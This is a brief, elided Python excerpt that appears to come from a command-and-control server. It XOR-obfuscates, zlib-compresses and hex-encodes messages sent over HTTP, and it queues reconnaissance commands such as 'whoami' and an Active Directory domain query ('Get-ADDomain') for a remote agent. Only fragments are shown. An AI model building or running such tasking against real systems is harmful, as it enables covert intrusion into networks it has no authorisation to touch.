...
def create_http_body(command=None, additional_data=""):
    ...
    if command is None:
        ...
        compressed_message = zlib.compress(xored)

        final_message = binascii.hexlify(compressed_message).decode("ISO-8859-1")
...
def find_desired_order(file_path_command):
    ...
    if file_path_command not in os.listdir():
        ...
        df = pd.DataFrame(data={"order":[5, 6, 5, 1], "additional_data":["whoami", "", "Get-ADDomain -Identity sigen.net", ""], "state":["waiting", "waiting", "waiting", "waiting"]})
        print(df)
